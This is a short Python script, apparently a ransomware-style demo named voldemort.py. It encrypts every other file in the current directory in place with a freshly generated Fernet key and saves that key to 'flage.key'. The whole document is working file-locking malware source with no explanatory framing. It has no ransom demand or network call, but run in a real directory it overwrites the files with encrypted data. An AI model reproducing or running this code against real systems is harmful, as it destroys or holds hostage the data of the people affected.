import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
    if file in ["voldemort.py", "decrypted.py", "flage.key"]:
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

with open("flage.key", "wb") as flage:
    flage.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)